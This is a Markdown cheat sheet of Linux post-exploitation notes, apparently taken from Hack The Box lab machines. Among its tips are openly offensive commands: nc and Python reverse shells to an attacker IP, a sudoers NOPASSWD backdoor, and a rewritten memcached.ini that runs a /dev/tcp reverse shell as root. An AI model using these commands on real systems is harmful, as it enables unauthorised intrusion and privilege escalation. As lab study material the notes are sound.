# Linux

## Upgrade to fully interactive shell with colours

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl-Z
stty raw -echo
fg
ls
stty rows 40 columns 150
export SHELL=bash
export TERM=xterm

export LS_OPTIONS='--color=auto'
eval "`dircolors`"
alias ls='ls $LS_OPTIONS'
export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] '
```

## General Linux tips

To get back to previous dir `cd -`

You may want to use **sucrack** over hydra if SSH is disabled from outside. Note that sucrack works only for one user at a time though.

Check ASCII table with `man ascii`

## Check OS version

`ls -lah /etc/*-release` os-release is specific to Debian distros.

### `find` files in Linux

Find only files (not dirs) in current dir and subdirs

```bash
find . -type f -ls
```

Find files readable by current user

```bash
find / -type f -readable -ls
```

Find files owned by jimmy

```bash
find / -user jimmy -ls 2>/dev/null
```

Compare files side by side with `diff -y <old> <new>`, or use `vimdiff` if available.

```shell
find / -path /proc -prune -false -o  -group ldapuser1 2>/dev/null
```

Find all files in **/** excluding **/proc** belonging to group **ldapuser1**

### Search files by modified dates

To find files modified between 01-01-2020 and 03-01-2020:

```shell
find / -newermt 2020-01-01 ! -newermt 2020-01-03 2>/dev/null
```

To confirm the file modified date

```shell
stat filename
```

Sudo and pipe. Sudo terminates at pipe

```shell
sudo <cmd1> | <cmd2>
```

Here <cmd2> is run as user, not root

#### /etc/sshd

**DenyUsers** can be used to deny SSH logins so try `su user` instead if unsuccessful.

#### mysql

This is equivalent to `SHOW COLUMNS FROM <table_name>`
```sql
describe <table_name>
```
#### git

Find git/svn repos by searching for `.git` and `.svn`
```shell
find . -name .git
```

#### Trace processes by parent PIDs

`ps -ef` allows you to see which processes spawn which other child processes, so you can track what commands actually do. Start with the PID of cmd entered, then see what it is a parent to and so on.

#### nohup to get another shell

If you need another shell, you can use `nohup <cmd> &` like this
```shell
pepper@jarvis /var/www/Admin-Utilities $ nohup nc -e /bin/bash 10.10.14.78 443 &
[2] 1009
```
or
```shell
pepper@jarvis /var/www/Admin-Utilities $ nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.78",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
[1] 999
```

#### Going from EUID 0 shell to root shell
Sometimes you can only get EUID 0, which still doesn't allow you to do certain things. Edit **visudo** to add to /etc/sudoers
> www-data ALL=(ALL) NOPASSWD:ALL

which gives user **www-data** the ability to get root with

```shell
www-data@cronos /tmp # sudo su -
root@cronos:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### pspy

Can view file open/read/writes with `pspy -f`.

## Display enum script output and write to file

```shell
./lse.sh -l2 2>&1 | tee lse.txt
```

## File permissions of parent folder

It's possible that you own a folder but not have read/write rights of files in them. In this case, you can't edit them but since you own the folder you can delete them and replace them with ones of the same name.

```shell
lacasadepapel [~]$ ls -lah
total 28
drwxr-sr-x    4 professo professo    4.0K Nov  6 14:49 .
drwxr-xr-x    7 root     root        4.0K Feb 16  2019 ..
lrwxrwxrwx    1 root     professo       9 Nov  6  2018 .ash_history -> /dev/null
-rw-------    1 professo professo     573 Nov  6 16:06 .bash_history
drwx------    2 professo professo    4.0K Jan 31  2019 .ssh
-rw-r--r--    1 root     root          88 Jan 29  2019 memcached.ini
-rw-r-----    1 root     nobody       434 Jan 29  2019 memcached.js
drwxr-sr-x    9 root     professo    4.0K Jan 29  2019 node_modules

lacasadepapel [~]$ cat ini_file 
[program:memcached]
command = sudo bash -c 'bash -i >& /dev/tcp/10.10.14.78/443 0>&1'

lacasadepapel [~]$ mv ini_file memcached.ini
mv: overwrite 'memcached.ini'? Y
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo bash -c 'bash -i >& /dev/tcp/10.10.14.78/443 0>&1'
```

